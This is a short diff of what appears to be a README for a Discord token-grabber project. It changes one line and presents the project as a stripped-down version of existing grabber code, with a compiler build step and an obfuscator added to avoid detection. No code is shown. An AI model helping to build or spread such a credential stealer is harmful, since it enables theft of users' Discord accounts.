@@ -1,4 +1,4 @@
-public discord token grabber suck.
+public discord token grabber suck./n
 they are to detectable and get you banned on discord within like a week
 this is a stripped version of AstraaDev's token grabber code with a nuitka builder and obfuscator added
 
